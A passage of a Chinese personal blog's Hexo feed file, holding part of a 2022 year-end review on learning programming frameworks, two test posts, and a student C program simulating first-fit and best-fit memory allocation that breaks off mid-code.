三要素」也参与到其中。</p></blockquote><blockquote><p><strong>例子3：</strong>一周两次有氧训练（跑10公里），一到两次的力量训练（俯卧撑100个，拉单杠50个），实际情况，未完成。该「计划」的制订，有考虑到可行性，当时上半年找了同学一起锻炼，还能基本完成，并且有手环记录，一周下来能够判断自己的是否跑足10公里，但是单杠的记录，没记多少次，后面忘记记了就不了了之。该过程就是缺少「复盘的反馈」，没有调整自己是否该增加锻炼了，有时候锻炼也忘记了单杠这回事。</p></blockquote><blockquote><p><strong>例子4：</strong>阅读25本书籍，其中10专业书，15课外书。实际情况，专业书阅读了4本，课外书阅读了11本，未完成年度目标。在整个过程中计划是可行的，该年度都在保持阅读，时闲下来就会阅读书籍。但是缺少「复盘的反馈」，有时阅读感觉收获了一些东西，但是又说不出来收获了啥，本来想写读书笔记来作为反馈的也没写。</p></blockquote><p><strong>决策：</strong>在该模型的归纳当中，我归纳了「计划」，「执行」，「复盘」与「完成年度计划」的关系。预测自己要想完成年度计划，需要「平衡三要素」特别是「复盘」。</p><h2 id="3-专业上的收获"><a href="#3-专业上的收获" class="headerlink" title="3.专业上的收获"></a>3.专业上的收获</h2><h3 id="3-1-框架的使用"><a href="#3-1-框架的使用" class="headerlink" title="3.1 框架的使用"></a>3.1 框架的使用</h3><p>该部分的结构如下，绿色是概括，灰色是过度解释等，蓝色是描述，橙色多数是描述对应的例子，黄色是迁移</p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20230103124345.png" alt="image-20230103124343725" style="zoom:67%;"><img src="E:/markdown%E6%96%87%E4%BB%B6/typroaPic/image-20230103124226826.png" alt="image-20230103124226826" style="zoom: 67%;"><h4 id="3-1-1-背景"><a href="#3-1-1-背景" class="headerlink" title="3.1.1 背景"></a>3.1.1 背景</h4><p>#c 过渡 目标</p><p>2022年使用使用框架做了许多的东西，如下所示；我在使用这些框架时，大多数是需要使用这个框架来完成一些课程作业。这一年使用了这五个框架来完成课程任务，下面从五个框架进行「归纳」，然后「预测」自己在使用下一个框架时，能够更快的上手一个框架。</p><blockquote><ul><li>使用Qt框架写了一个CS模式的算法可视化</li><li>使用Django框架写一个BS模式个人博客网站</li><li>使用微信小程序+django做了一个电子投票的系统</li><li>学习了vue框架的部分知识</li><li>使用hexo框架搭建了个人静态网站</li></ul></blockquote><p>#c 解释 输入输出</p><blockquote><p>这里选择的输入是「学习框架的方式」，对输入进行细分，我提取了「目录结构」，「基础编程语言」，「开发工具」，「常用组件」，「框架文档」，「算法」这六元素作为输入，输出是「框架所作出的项目」，渐构的模型是「从六元素出发可以帮助我们快速掌握一个框架」</p></blockquote><h4 id="3-1-2-认识框架"><a href="#3-1-2-认识框架" class="headerlink" title="3.1.2 认识框架"></a>3.1.2 认识框架</h4><p>#d 框架</p><blockquote><p>框架是一组基础代码，它为应用程序或网站的开发提供了一组结构和标准。框架通常包含一些基本的功能和组件，并为开发者提供了一组编程接口，使开发者能够在框架的基础上开发应用程序或网站。</p><p>框架的目的是为开发者提供一组统一的架构和编程模型，使他们能够更快地开发应用程序或网站，并使这些应用程序或网站更具可维护性和扩展性。</p></blockquote><p>#t 修建房子 框架</p><blockquote><p>现在我们在看建筑工人修建房子的时候，其中修建房子所需要的「材料」，如门，窗户，砂浆，砖瓦等都是已经准备好了，这些材料就好比框架提供的「一组结构和标准」。我门在修建房子时不用再去拉沙子，水泥，然后自己弄泥浆；也不用再自己去山上砍树，自己切木头来做门了直接使用已经提供好的。</p></blockquote><p>#e 微信小程序 框架<br>微信小程序提供了一组组件和 API，让开发者可以使用这些组件和 API 开发小程序应用，比如：界面布局、数据存储、网络请求、地图、视频、音频等。所以微信程序是一个框架。</p><h4 id="3-1-3-掌握框架"><a href="#3-1-3-掌握框架" class="headerlink" title="3.1.3 掌握框架"></a>3.1.3 掌握框架</h4><p>#c 发现 框架的特点<br>这里再经过几个框架的使用，我发现框架有一下共同特点，「目录结构」，「常用组件」，「基础编程语言」，「高级组件」，「开发工具」，「文档」等。我们想快速使用一个框架来开发一个demo，可以从一下几点考虑。</p><p>#c 提问 快速掌握<br>那么，我们如何快速掌握框架呢？</p><p>#d 掌握基础编程语言</p><blockquote><p>框架是使用对应的「基础编程语言」，来对功能进行封装的。只有再掌握「基础编程语言」过后，才能更好的学习框架。<br>有时框架提供的组件不满足我们的需求时，就需要修改组件的源代码，如果不熟悉框架所使用的语言的话，就会导致学习困难。框架的文档有时也有代码，不熟悉框架使用的语言的话，也会导致阅读文档的困难。</p></blockquote><p>#e django框架<br>比如Django这个Web框架，的基础编程语言是python，Django在进行「数据库查询过滤」的时候就需要使用python的「字典」和「列表」，如果不清楚字典和列表的话，就会导致学习困难，失去信心。</p><p>#e 微信小程序框架<br>微信小程序的开发语言是 JavaScript，所以开发者在使用微信小程序框架时，需要掌握 JavaScript 的基础知识。同时还要了解HTML文本标记，CSS样式，注意HTML与CSS不是「编程语言」。</p><p>#d 熟悉开发工具与目录结构</p><blockquote><p>有可框架有自己特有的开发工具，比如了解开发工具如何创建一个项目，设置功能等等。主要的是明白框架的目录结构，比如每个文件夹有什么作用，那些是主要的文件，我们创建的文件因该放在那个位置。</p></blockquote><p>#e 微信小程序目录结构<br><img src="http://www.mpgcw.com/wp-content/uploads/2021/02/2021021201.jpg"></p><blockquote><p>pages：这里存放小程序的页面文件。每个页面文件包含 HTML、CSS 和 JavaScript 三个部分，用于描述页面的结构、样式和交互功能。</p><p>components：这里存放小程序的组件文件。组件是可复用的页面元素，可以在多个页面中使用。每个组件文件也包含 HTML、CSS 和 JavaScript 三个部分，用于描述组件的结构、样式和交互功能。</p><p>utils：这里存放小程序的工具文件。工具文件通常是一些 JavaScript 文件，包含一些常用的函数和方法，可以在多个页面或组件中使用。</p><p>images：这里存放小程序的图片文件。</p><p>app.js：这是小程序的入口文件，包含小程序的初始化代码。</p><p>app.json：这是小程序的配置文件，包含小程序的名称、版本、页面路径等信息。</p><p>app.wxss：这是小程序的全局样式文件，包含小程序的全局样式规则。</p><p>比较重要的文件，如pages，app.js，app.json需要掌握。</p></blockquote><p>#d 掌握常用组件</p><blockquote><p>如果我们想使用一个框架来完成老师布置的课程设计，我们需要把一个框架学完才开始吗？这显然是不行的，一是时间上不允许，二是在学习时持久做不出来项目，会逐渐失去信心。所以我认为在「掌握常用组件」后，就可以开始写老师的课程设计了，因为小demo或者项目的反馈，有助于提高学习的兴趣。每个框架都有其特色并且经常使用的功能，我们在知道自己需要使用的常用功能后，可以寻找对应的资料来学习，B站视频，官方文档等都可以，这样就可以按需学习了。当我们逐渐的对这个框架熟悉过后，可以根据自己的需要选择学习「高级组件」或者系统的学习整个框架。</p></blockquote><p>#e Qt常用功能</p><blockquote><p>布局管理器：Qt 提供了多种布局管理器，可以让你轻松地调整窗口内部各个部件的位置和大小。<br>信号和槽：Qt 提供了信号和槽机制，可以让你在不同的部件之间传递消息。<br>窗口部件：Qt 提供了多种窗口部件，包括按钮、菜单、文本框、列表框等，你可以使用这些部件来构建应用程序的用户界面。<br>事件处理：Qt 支持事件处理机制，你可以使用事件处理函数来响应用户的操作。<br>图形绘制：Qt 提供了图形绘制功能，你可以使用它来绘制线条、曲线、图形等</p></blockquote><p>#d 训练文档的阅读</p><blockquote><p>当我们确定需要掌握的知识，就开始选择相应的资料进行学习了。「选择方式」比较多，如视频，文档，周围的同学等方式，这一年我是在B站上跟着视频进行学习的。但是我发现视频学习的一个问题，在学习过一个知识点过后，时间长，忘记了，需要找来回顾时，找特定的视频位置比较困难。这时通过文档就能很快的找到，但需要我们「训练文档的阅读能力」，以便自己能够在文档中获取自己需要的信息。</p></blockquote><p>#d 算法的训练</p><blockquote><p>之前在训练算法的时候，我在想我花时间解这道算法题，有什么作用呢？推动我学算法的动力在哪里呢？有时因为花时间，最后解出一道算法题的一种成就感。但也因为长时间没有解答出来，而逐渐失去信心。还不如做出一个小项目后的成就感强呢。</p><p>但是在今年先项目的过程中，我发现算法的重要性，在训练算法时，不应该用「是否解出算法题来反馈」，这样会导致长时间未解答出来而失去信心，应该用这个算法题「是否训练了自己的编程思维」来作为反馈。</p><p>「训练编写算法的能力」特点之一就是帮助我们训练「编程时的思维能力」，当我们在做项目的过程中，想到某个功能需求时，可以快速的实现。</p></blockquote><p>#e 嵌套for循环<br>我今年在写个人博客系统时，用户的Django框架，在后端处理数据时需要使用嵌套for循环来处理数据，但是这个嵌套for循环的判断却然我思考了好长一段时间。</p><h3 id="3-2-技术文章的写作"><a href="#3-2-技术文章的写作" class="headerlink" title="3.2 技术文章的写作"></a>3.2 技术文章的写作</h3><p>技术文章主要是发表在CSDN上面，虽然年度目标是在博客网站上发布50篇文章，才发了48篇，但是有几篇是已经写好了的没有发布。实际上是已经完成了的。</p><p><strong>解释：输入输出</strong></p><p>这里选择的输入</p><p><strong>描述：文章促进学习</strong></p><h2 id="4-课外的收获"><a href="#4-课外的收获" class="headerlink" title="4.课外的收获"></a>4.课外的收获</h2><h3 id="4-1-渐构的学习"><a href="#4-1-渐构的学习" class="headerlink" title="4.1 渐构的学习"></a>4.1 渐构的学习</h3><h3 id="4-2-阅读的收获"><a href="#4-2-阅读的收获" class="headerlink" title="4.2 阅读的收获"></a>4.2 阅读的收获</h3><h2 id="5-四年半异地"><a href="#5-四年半异地" class="headerlink" title="5.四年半异地"></a>5.四年半异地</h2><h2 id="6-2023年计划"><a href="#6-2023年计划" class="headerlink" title="6.2023年计划"></a>6.2023年计划</h2>]]></content>
      
      
      <categories>
          
          <category> 计划和总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>视频记录测试</title>
      <link href="/posts/18162.html"/>
      <url>/posts/18162.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-这是视频记录"><a href="#1-这是视频记录" class="headerlink" title="1.这是视频记录"></a>1.这是视频记录</h2><iframe class="my-movies" src="//player.bilibili.com/player.html?aid=55513374&amp;bvid=BV1d4411P7GR&amp;cid=97119880&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><h2 id="2-这是第二个视频"><a href="#2-这是第二个视频" class="headerlink" title="2.这是第二个视频"></a>2.这是第二个视频</h2><iframe class="my-movies" src="https://blog-pic-1314840905.cos.ap-chengdu.myqcloud.com/test.mp4" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
      
      
      <categories>
          
          <category> 视频记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编成学习 </tag>
            
            <tag> 项目经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全分类测试</title>
      <link href="/posts/54596.html"/>
      <url>/posts/54596.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-文章标签名的修改"><a href="#1-文章标签名的修改" class="headerlink" title="1.文章标签名的修改"></a>1.文章标签名的修改</h2>]]></content>
      
      
      <categories>
          
          <category> catrename </category>
          
      </categories>
      
      
        <tags>
            
            <tag> testfile </tag>
            
            <tag> rename </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu22.2下C语言编程实现，首次，最佳适应算法</title>
      <link href="/posts/1376.html"/>
      <url>/posts/1376.html</url>
      
        <content type="html"><![CDATA[<p>@<a href="%E5%8F%82%E8%80%83%E7%9B%AE%E5%BD%95%EF%BC%9A">TOC</a></p><h1 id="1-题目要求"><a href="#1-题目要求" class="headerlink" title="1.题目要求"></a>1.题目要求</h1><p>编写C语言程序，模拟实现首次/最佳/最坏适应算法(选择其中之一即可)的内存块分配和回收，要求每次分配和回收后显示出空闲分区和已分配分区的情况。假设初始状态下，可用的内存空间为640KB。<br>假设下列作业请求序列：<br>（1）作业1 申请130 KB   （2）作业2 申请60 KB  （3）作业3 申请100 KB<br>（4）作业2 释放60 KB    （5）作业3 释放100 KB （6）作业1 释放130 KB<br>显示每次作业申请或释放后当前内存情况。</p><h1 id="2-分析设计"><a href="#2-分析设计" class="headerlink" title="2.分析设计"></a>2.分析设计</h1><p>根据题目，分析设计如下：<br>（1）程序初始需要提供用户选择方式。选择首次适应算法，还是最佳是适应算法，选择作业的回收，作业的展示，程序的退出能。<br>（2）当用户选择首次适应算法或者最佳适应算法，需要用户输入分配内存的大小。在输入大小时在根据算法的设计进行分配。<br>（3）当内存分配过后，如果分配成功就需要提示成功，如果失败则需要提示失败。<br>（4）内存回收需要用户输入回收作业的ID，根据作业的ID对内存进行回收。在回收时要分多种情况进行判断。<br>（5）作业展示，需要向用户展示，作业的ID，起始地址，内存大小，状态是已分配还是空闲。<br>（6）一个作业需要用到数据结构中的双向列表，用一个双向列表来表示节点。</p><h1 id="3-程序代码"><a href="#3-程序代码" class="headerlink" title="3.程序代码"></a>3.程序代码</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">struct</span> <span class="token class-name">area</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> id<span class="token punctuation">;</span>             <span class="token comment">// 编号</span>  <span class="token keyword">int</span> addr_front<span class="token punctuation">;</span>     <span class="token comment">//首地址</span>  <span class="token keyword">int</span> addr_end<span class="token punctuation">;</span>      <span class="token comment">//结束地址</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span>           <span class="token comment">//分区大小</span>  <span class="token keyword">int</span> flag<span class="token punctuation">;</span>           <span class="token comment">//分配标志,0表示空闲，1表示占用</span>  <span class="token keyword">struct</span> <span class="token class-name">area</span> <span class="token operator">*</span>front<span class="token punctuation">;</span> <span class="token comment">//上一分区</span>  <span class="token keyword">struct</span> <span class="token class-name">area</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>  <span class="token comment">//下一分区</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">area</span> partion<span class="token punctuation">;</span>partion <span class="token operator">*</span>head <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">//分区队列头节点</span><span class="token keyword">int</span> need<span class="token punctuation">;</span>             <span class="token comment">//需求</span><span class="token keyword">int</span> choice <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>       <span class="token comment">//操作选项</span>partion <span class="token operator">*</span><span class="token function">createPartion</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token keyword">int</span> addr_front<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span> <span class="token keyword">int</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成一个节点</span><span class="token keyword">void</span> <span class="token function">inputNeed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                   <span class="token comment">//输入需求量</span><span class="token keyword">void</span> <span class="token function">assign</span><span class="token punctuation">(</span>partion <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> need<span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">//分配分区</span><span class="token keyword">void</span> <span class="token function">first_fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                   <span class="token comment">//首次适应算法</span><span class="token keyword">void</span> <span class="token function">best_fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token comment">//最佳适应算法</span><span class="token keyword">void</span> <span class="token function">showMemoryInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                              <span class="token comment">//打印分区分配状况</span><span class="token keyword">void</span> <span class="token function">recovery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token comment">//分区回收</span><span class="token keyword">void</span> <span class="token function">changeIdValue</span><span class="token punctuation">(</span>partion <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> delta<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">//改变从ptr开始所有节点的id值</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  head <span class="token operator">=</span> <span class="token function">createPartion</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">640</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>choice <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-------------------\n请选择操作:\n1:首次适应;\n2:最佳适应;\n3:内存回收;\n4:展示详细信息;\n0:推出......\n-------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>choice<span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>      <span class="token function">inputNeed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">first_fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>      <span class="token function">inputNeed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">best_fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>      <span class="token function">recovery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">showMemoryInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>      <span class="token function">showMemoryInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"byebye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//创建一个节点</span>partion <span class="token operator">*</span><span class="token function">createPartion</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token keyword">int</span> addr_front<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span> <span class="token keyword">int</span> flag<span class="token punctuation">)</span><span class="token punctuation">{</span>  partion <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>partion <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>partion<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  p<span class="token operator">-&gt;</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>  p<span class="token operator">-&gt;</span>addr_front <span class="token operator">=</span> addr_front<span class="token punctuation">;</span>  p<span class="token operator">-&gt;</span>addr_end<span class="token operator">=</span>addr_front<span class="token operator">+</span>size<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  p<span class="token operator">-&gt;</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>  p<span class="token operator">-&gt;</span>flag <span class="token operator">=</span> flag<span class="token punctuation">;</span>  p<span class="token operator">-&gt;</span>front <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  p<span class="token operator">-&gt;</span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">inputNeed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入需要的内存大小:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>need<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">first_fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  partion <span class="token operator">*</span>fit <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  partion <span class="token operator">*</span>ptr <span class="token operator">=</span> head<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>size <span class="token operator">&gt;=</span> need <span class="token operator">&amp;&amp;</span> ptr<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//如果是空闲并且大小大于则给予分配</span>    <span class="token punctuation">{</span>      fit <span class="token operator">=</span> ptr<span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    ptr <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fit <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">assign</span><span class="token punctuation">(</span>fit<span class="token punctuation">,</span> need<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"内存分配成功,分配如下：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">showMemoryInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"抱歉，内存分配失败!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>fit<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">best_fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  partion <span class="token operator">*</span>fit <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  partion <span class="token operator">*</span>ptr <span class="token operator">=</span> head<span class="token punctuation">;</span>  <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//flag 表示是否找到可分配的分区</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ptr<span class="token operator">-&gt;</span>size <span class="token operator">&gt;=</span> need<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token comment">//只有遇到的第一个可分配分区会执行此操作</span>        fit <span class="token operator">=</span> ptr<span class="token punctuation">;</span>        flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        <span class="token comment">//若遇到可分配且分区更小即更适合的则更新</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token operator">-&gt;</span>size <span class="token operator">&lt;</span> fit<span class="token operator">-&gt;</span>size<span class="token punctuation">)</span>        <span class="token punctuation">{</span>          fit <span class="token operator">=</span> ptr<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    ptr <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">//先处理没找到合适分区的情况</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"抱歉，未找到合适的分区!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>fit<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">//找到则分配</span>  <span class="token function">assign</span><span class="token punctuation">(</span>fit<span class="token punctuation">,</span> need<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"内存分配成功，分配如下:\n!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">showMemoryInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">showMemoryInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  partion <span class="token operator">*</span>ptr <span class="token operator">=</span> head<span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\n\n---------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"总内存分配情况如下:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"---------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"序号ID****开始地址****结束地址****内存大小****状态****"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%-12d%-12d%-12d%-12d"</span><span class="token punctuation">,</span>ptr<span class="token operator">-&gt;</span>id<span class="token punctuation">,</span>ptr<span class="token operator">-&gt;</span>addr_front<span class="token punctuation">,</span>ptr<span class="token operator">-&gt;</span>addr_end<span class="token punctuation">,</span>ptr<span class="token operator">-&gt;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// printf("序号id:%21d%10c\n开始地址:%10d%10c\n", ptr-&gt;id, '|', ptr-&gt;addr_front, '|');</span>    <span class="token comment">//printf("结束地址:%10d%10c\n", ptr-&gt;addr_end, '|');</span>    <span class="token comment">//printf("内存大小:%11d%10c\n", ptr-&gt;size, '|');</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%-12s\n"</span><span class="token punctuation">,</span> ptr<span class="token operator">-&gt;</span>flag <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">"空闲"</span> <span class="token operator">:</span> <span class="token string">"已分配"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr <span class="token operator">=</span> ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"---------------------------------------------\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">assign</span><span class="token punctuation">(</span>partion <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> need<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>need <span class="token operator">==</span> ptr<span class="token operator">-&gt;</span>size<span class="token punctuation">)</span><span class="token comment">//空闲的空间恰好等同需要的空间</span>  <span class="token punctuation">{</span>    ptr<span class="token operator">-&gt;</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">//空闲的空间大于需要的空间</span>  partion <span class="token operator">*</span>assigned <span class="token operator">=</span> <span class="token function">createPartion</span><span class="token 